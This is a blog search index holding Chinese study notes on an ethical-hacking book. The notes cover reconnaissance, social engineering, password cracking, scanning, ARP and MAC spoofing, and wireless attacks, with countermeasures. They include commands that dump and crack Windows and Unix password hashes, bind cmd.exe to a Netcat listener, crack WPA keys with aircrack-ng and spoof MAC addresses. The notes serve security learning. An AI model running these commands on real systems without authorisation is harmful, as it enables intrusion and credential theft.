<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[黑客阅读书籍笔记01]]></title>
    <url>%2F2018%2F09%2F11%2F%E9%BB%91%E5%AE%A2%E9%98%85%E8%AF%BB%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[道德黑客攻击（ethical hacking） 融合了渗透测试、白帽黑客攻击和漏洞测试 1.基础 2.攻击：社工攻击和破解 3.攻击网络 4.攻击操作系统：漏洞扫描 5.攻击应用程序：绕过防火墙、入侵监测系统和杀毒软件 6.结果 7.三个十项 惠普 乔·耶格尔 Acunetix 罗伯特·艾贝拉 AirMagnet 关嘉赐 Elcomsoft 弗拉基米尔·卡塔洛夫 Karalon 托尼·海伍德 GFI Software 维多利亚·马斯卡特·英格罗特 Northwest Performance Software 柯克·托马斯 Mythicsoft 戴维·维斯特 N-Stalker 蒂亚戈·扎尼诺蒂 Port80 Software 麦克·安德鲁斯和克里斯·内佩斯 TamSoft 迈克尔·伯格 Amenaza Technologies 特里·英格尔兹比 Identity Finder 艾米特·戈亚尔和弗恩·爱迪生 黑客 恶意内部用户：指无赖员工、承包商、实习生，或其他滥用其特权的用户 道德黑客 道德黑客攻击和安全审计： 安全审计是将公司的安全策略与实际发生的情况比较，目的 是验证安全控制措施的存在。 道德黑客攻击利用漏洞，验证安全控制措施是不到位的。 优先考虑系统，以便将工作重心放在关键事项上； 以非破坏性的方式来攻击系统； 枚举漏洞，如果有必要的话，还要向管理层证明漏洞是存在并可被利用的； 应用结果，以消除漏洞，并更好地保护系统安全。 社会工程学：指利用人类信任的天性来获取用于恶意用途的信息。 网络基础设施攻击： 通过没有安全措施的无线路由器连接到受防火墙保护的网络； 利用网络协议（TCP/IP和NetBIOS）的弱点进行攻击； 用大量请求占据网络，用合法请求造成拒绝服务（DoS） 在网络中安装网络分析器，捕捉通过网络传输的每个数据包，找出明文传输的机密信息。 安全性出色的系统（Novell NetWare和OpenBSD） 利用特定网络协议进行攻击； 攻击内置验证系统； 破坏文件系统安全措施； 破解密码和薄弱加密措施。 电子邮件和Web应用程序攻击： 大多数防火墙和其他安全机制都会被配置成允许完全访问这些来自互联网的服务。 IP电话（VoIP） 敏感信息的文件没采取安全措施就散步在工作站和服务器共享，数据库系统中含有很多可被恶意用户利用的漏洞。 应用道德黑客攻击流程： 拟定计划 对自己系统进行测试时，授权的形式可以是内部备忘录，也可以是来自老板的电子邮件 信息： 要进行测试的具体系统 所含风险 执行测试的时间和整体时间安排 测试前对待测系统的了解 在发现大漏洞后要采取的行动 具体成果：漏洞扫描的报告，待解决重要漏洞和待实施措施 选择工具 破解密码工具：ophcrack和Proactive Password Auditor 端口扫描程序：SuperScan或Nmap Web应用评估工具：N-Stalker或WebInspect 网络分析程序：Wireshark （搜索网站）http://groups.google.com www.linkedin.com http://SecurityFocus.com和http://SearchSecurity.com 软件的漏洞扫描器和硬件的网络分析器： Cain&amp;Abel OmniPeek SuperScan QualysGuard WebInspect Proactive Password Auditor Metasploit LANguard AirMagnet WiFi Analyzer 执行计划 被攻击者可以加密：PGP（www.pgp.com）、加密压缩文件或类似技术对含有敏感测试信息的Email加密 （1）在网上搜索组织的名称，计算机和网络系统的名称以及IP地址 （2）缩小范围，将目标对准索要测试的具体系统 （3）进一步缩小。执行实际的扫描和其他测试，发现漏洞 （4）可以执行攻击并利用漏洞（选） 评估结果 防范黑客： 黑客做法： 通过每隔几分钟改变自己的MAC地址和IP地址回避入侵防御系统。从而再进一步深入没有被完全封锁的网络 利用物理安全漏洞。再一大早，趁着办公室的百叶窗开着。。。 通过将恶意网站的网址改变成对应的十进制IP地址，并将十进制IP地址转换成Web浏览器中使用的十六进制，从而绕过Web访问控制措施 通过改变未经授权软件默认的TCP端口，使防火墙不会封锁这些软件的使用 在当地的WiFi热点附近设置无线“钓鱼点”，以吸引那些不知情的上网者们连接到流氓网络中，在这个网络中，他们的信息会被截获，而且很容易被操纵。 使用容易相信他人的同事的用户ID和密码，从而获取对敏感信息的访问权，而这种访问权在其他情况下是没法获得的。 拔掉联网闭路电视安全摄像头（用于监控进出机房或其他敏感区域的通道）的电源线或网线，从而自由进出。 为了隐藏身份，通过连接到邻居家未受保护的无线网络，对网站进行SQL注入或密码破解。 黑客水平分级： 脚本小子 骇客 安全研究者 黑客行为主义者 网络恐怖分子 寻租黑客（犯罪分子） 攻击风格： 放长线钓大鱼 贸然行动 无处不在的恶意用户 黑客匿名方式： 从朋友或以前的雇主那里借来的或盗来的拨号和VPN账户； 图书馆、学校或当地商场信息亭中的公用计算机； 开放的无线网络； 因特网代理服务器或匿名服务； 来自于免费Email的匿名或一次性Email账户； 开放的Email中继； 在其他组织中的不安全计算机（也称僵尸或机器人） 受害者网络中的工作站或服务器 Camtasia Studio（www.camtasia.com）进行记录屏幕行动 攻击方法论： 1.Web搜索： 员工姓名和联系方式； 公司的重大日期； 设立申请； 提交给证券交易委员会的申请； 与行动、组织变化和新产品有关的出版物； 兼并和收购； 专利和商标； 演说、文章和网络广播或网络研讨会。 高级Web搜索 使用交换器深挖网站 site:www.your_domain.com 关键词 site:www.your_domain.com 文件名 filetype:swf company_name filetype:pdf company_name confidential 2.Web爬虫 例如：HTTrack Website Copier 可以通过下载可公开访问的每个文件制成网站的镜像 网站的排版和配置； 其他情况下不外显或不易于访问的目录和文件； 网页的HTML和脚本源代码； 评论区域。 3.网站 政府和企业网站： www.hoovers.com和http://finance.yahoo.com提供了与上市公司有关的详细信息 www.sec.gov/edgar.shtml展示了上市公司提交给证券交易委员会的文件； www.uspto.gov提供了专利和商标注册功能； 背景检查和其他个人信息： ChoicePoint(www.choicepoint.com); USSearch(www.ussearch.com) ZabaSearch(www.zabasearch.com) 映射网络 1.Whois 互联网域名注册信息 负责解析大家所在公司域名的DNS服务器 Whois。net（www.whois.net） 域名注册网站 ISP的技术支持网站 （DNSstuff.com）（www.dnsstuff.com） 政府：www.dotgov.gov; 军事：www.nic.mil; AfriNIC：www.afrinic.net; APNIC:www.apnic.net; ARIN:https://ws.arin.net/whois/index.html; LACNIC:www.lacnic.net/en RIPE网络协调中心：www.db.ripe.net/whois; 如果不确定道理查询特定国家信息，访问https://www.arin.net/knowledge/rirs/countries.html; 2.Google群组 3.隐私政策 扫描系统 主机 ping 让用户可以同时ping多个地址的第三方实用程序。reg:SuperScan(www.foundstone.com/us/resources/proddesc/superscan3.htm),用于Win系统的NetScanTools Pro（www.netscantools.com）,Linux系统fping(www.fping.com) 网站www.whatismyip.com可以显示出现在网上的网关IP地址。 开放的端口 SuperScan或Nmap(http://nmap.org) OmniPeek(www.wildpackets.com)和Wireshark(www.wireshark.com) 扫描端口获得的信息： 在使用的协议，reg：IP、IPX和NetBIOS 运行在主机上的服务，reg：Email、Web服务器和数据库应用 可用的远程访问服务，reg：Win终端服务、远程桌面、VNC和Secure Shell（SSH） VPN服务，reg：PPTP、SSL和IPSec 网络共享所需权限 ping（ICMP回声）的应答，允许ICMP流量出入主机； TCP端口21，表示FTP在运行 23 25、465 53 80、443和8080 135、137、138、139和445 端口了解网站：www.iana.org/assignments/port-numbers 执行端口号查找：www.cotse.com/cgi-bin/port.cgi 检查版本： 输入域名，加上一个不存在的网页 使用Netcraft的What`s that site running?(www.netcraft.com) 深挖： NMapWin（http://sourceforge.net/projects/nmapwin）可以确定系统的操作系统版本 枚举实用程序（www.systemtools.com/somarsoft/?somarsoft.com上的DumpSec）可以直接从Win提取用户、群组以及文件和共享权限 banner信息：telnet mail.your_domain.com 25 共享查找工具（GFI LANguard中内置的工具） 发送到无效地址的Email可能会返回详细的Email标题信息 评估漏洞： 搜索黑客的留言板、网站和漏洞数据库。 手动评估； 自动评估。 Qualys（www.qualys.com）-&gt;QualysGuardSuite漏洞扫描器 渗入系统 了解更多与主机及其数据有关的信息； 获得远程命令提示符； 启动或停止某些服务或应用； 访问其他系统； 禁用日志记录或其他安全控制措施； 捕捉屏幕截图； 访问敏感文件； 以管理员名义发送Email； 执行SQL注入攻击； 启动另一类拒绝服务攻击； 上传文件 （工具：Metasploit） 《开源安全测试方法手册》www.isecom.org/osstmm 社会工程学 例子： 假冒的支持人员声称他们需要在用户的计算机上安装补丁或新版软件，说服用户下载软件，获得对系统的远程控制。 假冒的供货商声称需要更新组织的会计包或电话系统，向管理员询问密码，获得全部访问权限。 外部入侵者发送钓鱼Email，收集不知情收件人的用户ID和密码。然后利用密码获利。reg：Web表单上的跨站脚本漏洞攻击。 假冒的员工会告知保安台他们丢失了机房的要钥匙，并从保安那里拿到一串钥匙，进而在未经授权的情况下接触到实体信息和电子信息。 艾拉·温克勒 社会工程学的影响 高效的社会工程师会获得： 用户或管理员的密码； 建筑物甚至是机房的安全通行卡或钥匙； 设计规范、配方或其他研发文档之类的知识产权； 机密的财务报表； 私人的和保密的员工信息； 客户名单和销售前景。 执行步骤： （1）进行研究； （2）简历信任； （3）利用关系，通过言语、行动或技术套取信息 （4）将收集到的信息用于恶意目的。 钓取信息 1.使用互联网 2.翻找垃圾箱（可以查到：） 内部电话名单； 组织图； 员工手册，这里通常会包含安全政策； 网络图； 密码清单； 会议记录； 电子表格和报表； 包含机密信息的电子邮件打印稿。 3.电话系统 住宅电话 企业电话 IP电话服务器，需安装Asterisk（www.asterisk.org） 建立信任 可爱性 可信性 利用关系 1.通过言行欺骗 2.通过技术欺骗 防范社工政策： 分类数据； 聘用员工和承包人，并设定用户ID； 建立器可接受的计算机使用惯例； 删除不再为组织工作的员工、承包人和顾问的用户ID； 设置和重置密码； 响应发现可疑行为之类的安全事件； 处理专有信息和机密信息； 接待访客。 物理安全： 建筑大小； 建筑或场所的数目； 员工的数量； 建筑出入口的位置和数量； 数据中心和其他机密信息的位置安排。 测试工程师的总结：（常见的物理安全漏洞） 在办公建筑内没有接待员； 进入建筑不需要访客登记或陪同人员； 只因为访客穿着供应商制服或是自称复印机或计算机维修人员，员工就相信这些访客； 没有门禁系统； 安保闭路电视和数据中心管理系统可以通过带有默认用户ID和密码的网络访问； 门是撑开的； 随意进出的机房； 随处摆放的备份介质； 不安全的计算机硬件（特别是笔记本电脑）和软件介质 垃圾桶中带有机密信息的光盘。 建筑结构 1.攻击点 2.对策 公共设施 1.攻击点 2.对策 办公室布局和使用 1.攻击点 2.对策 网络组件和计算机 1.攻击点 2.对策 密码 密码漏洞： 组织或用户的漏洞 技术漏洞 组织漏洞 彩虹表：可以破解几乎任何字母和数字组合的密码。测试是6天破解1845个密码 除非教育和提醒用户使用强密码，否则： 易于猜解 很少更换 在很多地方重复使用 在不安全的地方写下密码。 技术漏洞 脆弱的密码加密模式 将密码存储在内存、不安全文件和易访问数据库中的程序 在输入密码时将密码显示在屏幕上的用户应用。 破解密码： 旧方法： 1.社工 2.肩窥 3.推理 4.脆弱的认证 新方法： 1.软件： Cain&amp;Abel(www.oxid.it/cain.html)可以破解LM和NTLM散列，Windows RDP远程，思科IOS和PIX散列，VNC，RADIUS chknull（www.phreak.org/archives/exploits/novell）会检查没有密码的Novell NetWare账户 Elcomsoft Distributed Password Recovery (www.elcomsoft.com/edpr.html)，破解Office，PGP和PKCS，使GPU加速50倍，与Elcomsoft Wireless Auditor一样。 Elcomsoft System Recovery（www.elcomsoft.com/esr.html）破解Win密码，设置权限 John the Ripper（www.openwall.com/john）破解Linux/UNIX和Win密码的散列 ophcrack（http://ophcrack.sourceforge.net）通过引导光盘使用彩虹表破解Win密码 Pandora（www.nmrc.org/project/pandora）在线或离线破解Novell NetWare密码 Proactive Password Auditor(www.elcomsoft.com/ppa.html)蛮力攻击，字典攻击和彩虹攻击 Proactive System Password Recovery(www.elcomsoft.com/pspr.html)恢复Win密码（各种密码） pwdump3(www.openwall.com/passwords/dll/pwdump/pwdump3v2.zip)从SAM数据库提取Windows密码散列 RainbowCrack(http://project-rainbowcrack.com) 原理： 密码破解会采用一组已知的密码，并对它们执行密码散列算法。然后生成的加密散列就会飞速与从原始密码数据库中提取出的密码散列进行比较。 密码在存储到计算机上时，通常会使用加密算法或单向散列算法（reg：DES或MD5）加密。散列过的密码就会表示成固定长度的加密字符串，同样的字符串总是表示相同的密码。 Win密码存储位置： c:\winnt\system32\config SAM 存储在本地或分布在域控制器中的Active Directory数据库文件（ntds.dit），Win有时会存在c:\winnt\repair 一些Win应用程序会将密码存储在注册表或键盘上的明文文件中。 Linux和其他UNIX的变体存放位置： /etc/password everyone /etc/shadow sys和根账户 /etc/security/passwd sys和根账户 /.secure/etc/passwd sys和根账户 2.字典攻击 ftp://ftp.cerias.purdue.edu/pub/dict ftp://ftp.ox.ac.uk/pub/wordlists http://packetstormsecurity.nl/Crackers/wordlists www.outpost9.com/files/WordLists.html BlcakKnightList(http://rs159.rapidshare.com/files/184075601/BlackKnightList.rar)应该是最全面的 附：可以使用其他语言的文件 3.蛮力攻击 Mask Attack 4.彩虹攻击 破解LM、NTLM、思科PIX和MD5密码散列，成功率接近100% 不能用于破解无限长度的密码散列。 当前支持的LM散列最大长度是14个字符。 http://ophcrack.sourceforge.net购买和下载 存在长度限制的原因是生成这些彩虹表需要花费大量时间。 5.使用pwdump3和John the Ripper （1）在Win C根目录下创建passwords新目录 （2）下载压缩工具 （3）将软件下载到passwords下，解压安装 pwdump3: www.openwall.com/passwords/dll/pwdump/pwdump3v2.zip John the Ripper:www.openwall.com/john (4)将输出重新指向一个名为cracked。txt的文件 c:\passwords\pwdump3 &gt; cracked.txt 该文件存放了John the Ripper破解的Win SAM密码散列 （5）运行John the Ripper来破解Win SAM c:passwords\john cracked.txt 6.使用John the Ripper破解UNIX密码 需要对/etc/passwd和shadow有root访问权限 (1)www.openwall.com/john下载UNIX版源文件 （2）输入： [root@localhost kbeaver]# tar -zxf john-1.7.1.tar.gz (3)进入提取该程序时所创建的/src目录 make generic (4)进入/run目录，输入命令，使unshadow程序将passwd和shadow文件合并，并复制到cracked.txt中 ./unshadow /etc/passwd /etc/shadow &gt; cracked.txt (5)破解 ./john cracked.txt 7.使用ophcrack和彩虹表破解Win密码 （1）http://ophcrack.sourceforge.net下载 （2）输入： ophcrack-win32-installer-3.3.1.exe (3)加载 （4）“Load” （5）“Launch”开始彩虹攻击 8.检查NetWare中的空密码或空白密码 使用chknull程序，测试密码为空的、密码与用户名一致的以及密码与在命令行输入的特定密码一致的NetWare用户 受密码保护的文件 1.破解 2.对策 其他方法： 1.按键记录 SpectorSoft(www.spectorsoft.com)的eBlaster和Spector Pro Invisible KeyLogger Stealth（www.amecisco.com/iks/htm） KeyGhost(www.keyghost.com) 对策：1.权限2.商业软件：Fortres 101(www.fortresgrand.com) Deep Freeze(www.faronics.com/html/deepfreeze.asp) 2.脆弱的密码存储 Identity Finder Pro（www.identityfinder.com/pro） 3.网络分析器 Cain&amp;Abel OmniPeek(www.wildpackets.com/products/distributed_network_analysis/omnipeek_analyzer) CommView(www.tamos.com/products/commview) WireShark 对策1.在网络中使用交换机，而不要使用集线器。 2.确保那些不受监管的区域没有使用中的网络连接 3.不要让没有业务需要的人接触到交换机或防火墙公网端的网络连接 4.弱BIOS密码 www.cirt.net/passwords 对策：PGP或全卷加密(Windows BitLocker) 5.被遗忘的弱密码 6.密码重置程序 用Elcomsoft System Recovery将该工具刻录到光盘上，使用该光盘来引导想要恢复密码的系统 若是Win系统，还可以使用NTAccess+ophcrack Linux系统,使用Knoppix 对策：硬盘加密：Windows BitLocker或PGP Whole Disk Encryption 应对破解密码的措施： 存储密码: PGP Password Safe 其他策略： 启动安全审计，帮助监控和追踪密码攻击； 测试应用，确保它们没有将密码无限期地存储在内存中或是写入到磁盘中； WinHex(www.winhex.com/winhex/index-m.html) 及时为系统打补丁； 了解用户ID； DumpSec 更强的身份验证方法； 自动化的密码重置； 用密码保护BIOS系统 保护操作系统安全： Windows 权限 使用公认的实践（www.cisecurity.org） SYSKEY SAM备份安全 15位以上的LM散列 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa创建NoLMHash，键值设为1 使用passfilt.dll、本地安全策略或组安全策略 禁用空会话 Linux和UNIX shadow处理过的MD5密码 协助防止设定弱密码 检查/etc/passwd文件有没有重复的rootUID项 网络基础设施 坎迪斯·莱顿和马歇尔·维伦斯基所著的TCP/IP For Dummies第6版 www.rfc-editor.org/rfcxx00.html 评估时： 防火墙或入侵防御系统这样的设备被置于网络中的什么位置，是怎样配置的。 在外部攻击者执行端口扫描时，他们能看到什么，他们会如何利用网络主机上的漏洞 网络设置，诸如互联网连接、远程访问能力、分层防御的网络中主机的位置 诸如防火墙、入侵防御系统、防病毒设备等已安装安全设备的相互作用 使用哪些协议 未受保护的常受攻击端口 网络主机的配置 网络监控和维护 工具-&gt;扫描器、分析器和漏洞评估工具 扫描器和分析器 SuperScan用于ping扫描和端口扫描 Essential NetTools有多种多样的网络扫描功能 NetScanTools Pro包括ping扫描、端口扫描和SMTP中继测试 Getif可用于SNMP（网络管理协议）枚举 Nmap，NMapWin用于主机端口探测和操作系统特征分析 Cain&amp;Abel用于网络分析和ARP攻击 WildPackets的OmniPeek可用于网络分析 漏洞评估 GFI LANguard用于端口扫描和漏洞测试 Nessus具有ping扫描，端口扫描和漏洞测试功能 QualysGuard用于深度漏洞测试 扫描、扰动和刺探 （1）收集信息并映射网络 （2）扫描系统柯克哪些系统是可用的 （3）确定发现了系统上运行的东西 （4）渗入所发现的系统（选） 端口扫描器 7,19,20，21,22,23,25,37,53,69,79,80,110,111,135,137、138、139、445,161,443,512、513、514,1433,1434,1723,3389,5631、5631,8080 1.ping扫描 2.使用端口扫描工具 SuperScan Nmap： 连接：查找TCP端口，确定入侵检测系统(IDS)、入侵防御系统(IPS)、防火墙或其他日志记录设备有没有记录这些连接 UDP扫描 SYN秘密扫描：与主机建立半开的TCP连接，躲避IDS系统和日志记录。 FIN秘密扫描、圣诞树扫描和Null扫描：这些扫描会改变每个TCP数据包头部的标志位，让用户可以测试主机处理这些数据包的方式，从而找出薄弱的TCP/IP实现以及要打的补丁。 NetScanTools Pro 收集一般性的网络信息，reg：独立IP地址的数量、NetBIOS名称和MAC地址 3.防御ping扫描和端口扫描的对策 只启用访问内部主机所需的通信，并拒绝一切其他通信。这适用于标准端口，可以应用到： 用于入站通信的外部路由器 用于出站通信的防火墙 对防火墙进行配置，逐渐查找潜在的恶意行为（reg：在一段特定时间内接收到的数据包的数量），如果达到某个特定阈值，reg：1分钟内出现10次端口扫描，或者是出现100次连续ping请求。 SNMP扫描 1.漏洞 被攻破之后就可以收集reg：ARP表，用户名和TCP连接之类的网络信息 商业工具NetScanTools Pro和Essential NetTools 基于图形用户界面的免费Windows软件Getif 基于文本的免费Windows软件SNMPUTIL 2.防御SNMP攻击的对策 如果不使用SNMP，总是在主机上禁用SNMP 在网络边界阻断SNMP端口（UDP端口161和162） 将SNMP community读字符串默认的public和community写字符串默认的private改为几乎不会被猜解的长而复杂的值 banner获取 banner是透露网络主机的软件版本号和其他系统信息的欢迎屏幕。 1.telnet telnet ip_address 连接其他端口： SMTP: telnet ip_address 25 HTTP: telnet ip_address 80 POP3: telnet ip_address 110 2.防御banner获取攻击的对策 如果使用会提供banner信息的某些服务并非业务需求，就请在网络主机上禁用这些无用的服务。 如果默认的banner不是业务需要，或者如果可以定制banner，那么通过配置网络主机的应用程序或操作系统禁用banner，或者是一处banner中可能被攻击者利用的信息。请根据具体的厂商来查询与如何完成这些工作有关的信息。 防火墙规则 一些扫描工具可以测试开放端口，并确定流量是否真正被允许穿过防火墙 1.测试 Netcat 可以在不用直接测试生产系统的前提下测试特定的防火墙规则。reg：我们可以检查防火墙是否允许端口23通过，按以下操作： （1）在网络内部的客户机上加载Netcat 这一步会建立出站连接 （2）在防火墙外的测试机上加载Netcat 这是让测试从外向内进行 （3）在客户机上输入Netcat的监听器命令，并输入要测试的端口号 nc -l -p 23 cmd.exe (4)输入Netcat命令，在测试机上启动入站会话。必须有： 待测内部机的IP地址 要测试的端口号 reg：如果内部机的IP地址是10.11.12.2，端口号是23，就输入： nc -v 10.11.12.2 23 如果Netcat在外部机上打开了新的命令提示符，就说明已经连接上内部机，并能执行内部机上的命令了。 Traffic IQ Pro 用户可以将第一块网卡NIC连接到防火墙的内部网段中，将第二块网卡连接到防火墙外部网段或隔离区（DMZ） Firewalk 会发送生存时间（TTL）递增1的TCP和UDP数据包，并根据响应情况确定数据包是否通过了可用的端口 2.防御防火墙规则库漏洞的对策 严格限制流量 阻止ICMP，以帮助防止外部攻击者通过扰动和刺探网络查看那些主机处于活动状态。 如果可以的话，启用防火墙上的状态数据包检测功能。这可以阻止某些请求。 网络分析器 也称为嗅探器。 适合用于从线路中嗅探出数据包，是运行在计算机上，与网卡协同工作的软件，会将网卡设置成混杂模式。 功能： 捕获所有的网络流量； 将找到的信息解读或解码成可供人们阅读的格式； 按照时间顺序显示内容 查看异常的网络流量，甚至可以跟踪入侵者； 在安全事故发生之前为网络活动和网络性能设置一个基准 //跟踪和隔离恶意的网络使用情况； //检测恶意木马程序； //监控和跟踪拒绝服务攻击 1.网络分析器程序 WildPackets的OmniPeek Tamosoft的CommView Cain&amp;Abel Wireshark ettercap 要捕获所有流量，就必须将分析器连接到以下位置： 网路中的集线器； 交换机上的监控/SPAN/镜像端口； 进行过ARP攻击的交换机。 如果想要看看与基于网络的IDS所看到的类似的流量，就应该将网络分析器连接到防火墙外侧的集线器或交换机监控端口上： 在防火墙过滤器消除垃圾流量之前会有什么进入网络； 在流量经过防火墙之后还有什么会留在网络中。 要了解的问题： 怪异的流量： 数量异常的ICMP数据包 过量的多播或广播流量 不属于特定环境的数据包类型 互联网使用习惯： 上网； 电子邮件； 即时消息和其他P2P软件 有疑问的使用： 很多数据包丢失或者过大，表明出现了黑客工具或恶意软件； 很高的带宽占用率，可能说明出现了不该出现的Web或FTP服务器。 端口扫描器和漏洞评估工具机型的侦查性探测和系统分析： 比如来自未知主机的大量入站流量，尤其是通过不常用端口流入的 进行中的黑客攻击 比如海量的入站UDP或ICMP echo请求、SYN洪流或过量的广播 网络中出现非标准的主机名 那些可能吃掉网络带宽、提供非法软件或访问网络主机的隐藏服务器 对特定应用程序进行的攻击 reg：出现诸如/bin/rm、/bin/ls、echo和cmd.exe这样的命令，出现SQL查询和Javascript注入。 如果网络分析器支持的话，请将网络分析器设置为使用先进先出（FIFO）的缓冲区 如果网络分析器支持的话，请将所有捕获的流量记录到一个文件中，并将其存储在硬盘上。 当网络流量从网络分析器中看起来不正常时，实际情况可能并非如此。 CommView NetResident 2.应对网络协议漏洞的策略 物理安全 网络分析器的探测 Sniffdet,用于UNIX系统 PromiscDetect，用于Windows系统 可以让用户监控网络中是否有处于混杂模式的以太网卡 对MAC的攻击 1.ARP欺骗（Address Resolution Protocol，地址解析协议） ARP表：即那些存储着IP地址到MAC（media access control,媒体访问控制）地址的映射的表。 改变此表可以使其将数据包发到攻击者电脑，ARP欺骗是用于MITM(man-in-the-middle,中间人)攻击的 伪造的ARP应答可以被发送到交换机，让交换机回到广播模式，从而在实质上将其变为集线器。 reg：攻击者Hacky 两个合法网络用户（Joe和Bob） (1)Hacky使用dsniff、ettercap或他自己编写的实用程序对受害者Joe和Bob机器上的ARP缓存进行欺骗 (2)Joe将Hacky的MAC地址与Bob的IP地址关联起来 (3)Bob将Hacky的MAC地址与Joe的IP地址关联起来 (4)Joe的通信数据和Bob的通信数据都会首先被发送到Hacky的IP地址 (5)Hacky的网络分析器会捕获Joe和Bob的通信数据 2.使用Cain&amp;Abel进行ARP攻击 1-12步 3.MAC地址欺骗 基于UNIX系统： (1)禁用网络接口 # ifconfig eth0 down (2)为想要的MAC地址输入命令 # ifconfig eth0 hw ether new_mac_address Linux可以使用GNU MAC Changer 基于Windows： cmd-&gt;regedit.exe (1)加载 (2)选择MAC (3)在“New Spoofed MAC Address”(伪造的新MAC地址)，-&gt;&quot;Update MAC&quot; (4)&quot;Network and Dialup Connections&quot;(网络和拨号连接)中右击网卡，选择“Disable”(禁用) 再次右击，“Enable” 重启电脑 (5)点击SMAC界面的“Refresh” 选择需要更改MAC地址的适配器 点击“Remove MAC” 重复（4）步骤 点击SMAC界面中的”Refresh“ 4.防御ARP攻击和MAC地址欺骗攻击的对策 阻止. 如果交换机可启用端口安全功能防止MAC地址表的自动改变，那么就可以阻止MAC地址欺骗 检测 可以通过IDS、IPS，或是独立的MAC地址监控工具检测者两类黑客攻击。 Arpwatch 拒绝服务（DoS） 1.拒绝服务攻击 SYN洪水攻击：攻击者会用大量TCP SYN数据包淹没主机 死亡之ping：攻击者会发送超过最大长度65535字节的IP数据包，从而最终将很多操作系统的TCP/IP栈弄崩溃 WinNuke：这种攻击可以在较老的Windows95和WindowsNT计算机上禁用联网功能 分布式拒绝服务攻击（Distributed DoS,DDoS） 2.测试 QualysGuard和WebInspect UDPFlood Blast NetScanTools和CommView 3.防御拒绝服务攻击的对策 尽快地测试安全补丁（包括服务包和固件更新）并未网络主机（如路由器和防火墙）以及服务器和工作站的操作系统应用这些补丁 使用IDS或IPS定期监控拒绝服务攻击 将防火墙和路由器配置成阻止恶意流量。 将IP欺骗的概率降到最低。这需要过滤多个地址的外部数据包 阻止所有的ICMP入站流量进入网络。 禁用所有不需要的TCP/UDP小服务，如echo和chargen 路由器、交换机和防火墙的常见弱点 不安全的接口 IKE（Internet Key Exchange,因特网网密匙交换）弱点 一般性网络防御措施 （打字打累了。。。。百度吧） 无线局域网（WLAN，也叫做Wi-Fi） 基于IEEE 802.11标准 Windows评估无线网络的工具： NetStumbler AirMagnet WiFi Analyzer WildPackets的OmniPeek Elcomsoft Wireless Security Auditor aircrack 还需要合适的硬件。Orinoco 802.11b PC卡的组合。能与NetStumbler兼容，还能外接天线。 芯片组了解信息：The Seattle Wireless Hardware Comparison(西雅图无线硬件对比) 手持式无线安全测试设备，reg：Canary Wireless公司好用的数字热点追踪器（Digital Hotspotter）以及AirMagnet Handheld Analyzer。 无线天线分类： 全方位天线 半定向天线 定向天线 www.cantenna.comSuper Cantenna套件 http://mywebpages.comcast.net/hughpep 发现无线局域网 检查是否已被识别 arp-a来确定MAC地址 www.wigle.net www.wifimaps.com www.wifinder.com 扫描本地点波 寻找SSID（service set identifier,服务集标识符） NetStumbler可以发现： MAC地址； 名称； 使用中的无线电信道； 供应商名称； 是否启用了加密； 射频信号强度 测试蓝牙认证/配对和数据传输弱点的资源和工具 Car Whisperer(http://trifinite.org/trifinite_stuff_carwhisperer.html) Blooover(http://trifinite.org/trifinite_stuff_blooover.html) BlueScanner(https://labs.arubanetworks.com) Bluesnarfer(www.alighieri.org/tools/bluesnarfer.tar.gz) 蓝牙狙击枪(http://www.tomsguide.com/us/how-to-bluesniper-pt1,review-408.html) Bluejacking社区网站(www.bluejackq.com) Windows XP版BTScanner(www.pentest.co.uk/src/btscanner_1_0_0.zip) Smurf(www.gatefold.co.uk/smurf) 各种蓝牙攻击的详细展示(http://trifinite.org/Downloads/21c3_Bluetooth_Hacking.pdf) 加密流量 802.11的加密协议 有限等效保密（Wired Equivalent Privacy，WEP）：使用了对称(共享秘钥)加密算法RC4 Wi-Fi保护访问（Wi-Fi Protected Access，WPA） 使用WEPCrack，AirSnort，aircrack(http://aircrack-ng.org)破解 下载并提取aircrack程序集，cygwin Linux模拟环境，以及支持PEEK文件 WEP的静态秘钥调度算法，使秘钥长度每增加1位，破解就需要增加20000个左右。 破解预共享秘钥： # aircrack-ng -a2 -w path_to_wordlist &lt;capture file(s)&gt; EWSA,只要以tcpdump格式捕获无线数据包，讲捕获文件载入该程序，就可以破解了。前提是要有支持NVIDIA或ATI显卡的计算机。 防御加密流量攻击的对策 解决WEP问题最简单的办法就是为所有的无线通信使用WPA，WPA2.也可以通过为客户端通信启用点对点隧道协议（PPTP），在Windows环境下使用VPN来解决这一问题。 还可以使用Windows内置的IPSec支持、Secure Shell(SSH)、安全套接层/传输层安全(Secure Sockets Layer/Transport Layer Security,SSL/TLS)，来保证网络流量的安全。 流氓无线设备 流浪接入点一般具有下列特征： 奇怪的SSID，包括常见的默认名称linksys和wifi 奇怪的接入点系统名称--如果硬件支持该功能的话，就是指接入点的名称。别将其与SSID弄混了 不属于自己网络的MAC地址。看MAC地址的前三个字节，这是表明厂商名称的。可以在网上查询MAC地址对应的厂商 弱无线信号，这可能表明接入点在隐藏自身或是接入点处于组织所在的建筑之外。 出现在不是自身网络通信所用无线信道上的通信。 无线局域网客户端网络吞吐量的下降。 攻陷方法：《Hacking Wireless Networks For Dummies》 可以使用手持式数字热点追踪器(Digital Hotspotter)，搜索ESS字段不为1的信标数据包。 防御流氓无线设备的对策 MAC欺骗 将接入点配置成只允许具备已知MAC地址的无线客户端连接道网络。 测试MAC地址控制的步骤： （1）找到可供连接的接入点 （2）使用无线局域网分析器，查找向广播地址发送探测请求数据包的无线客户端，或是以探测响应进行回复的接入点 （3）将测试机的MAC地址改为步骤2所发现无线客户端的MAC地址。 a)登录道具有root权限的账户，然后禁用网络接口。 # ifconfig wlan0 down b)输入想要使用的新MAC地址 # ifconfig wlan0 hw ether 01:23:45:67:89:ab # ip link set wlan0 address 01:23:45:67:89:ab c)使用以下命令重新启用该网络接口： # ifconfig wlan0 up MAC Changer(www.alobbs.com/macchanger) SMAC (4)确保无线网卡为适当的SSID进行过配置 (5)在网络中获取IP地址 (6)通过ping其他主机或浏览互联网，确认自己已经连到网络中 防御MAC欺骗的对策 WPA，WPA2 昆士兰拒绝服务攻击 （百度脑补吧，太底层了。。。） 防御拒绝服务攻击的对策： 在802.11b/g网络中安装病使用无线入侵防御系统。 使用具有跳频扩频(frequency hopping spread spectrum)或正交频分复用(OFDM)功能的无线技术。 物理安全问题 设置在建筑物以外以及能被公众接触到的接入点 未经妥善安装的天线，导致广播太强的信号或是可悲公众接触。 防御物理安全问题 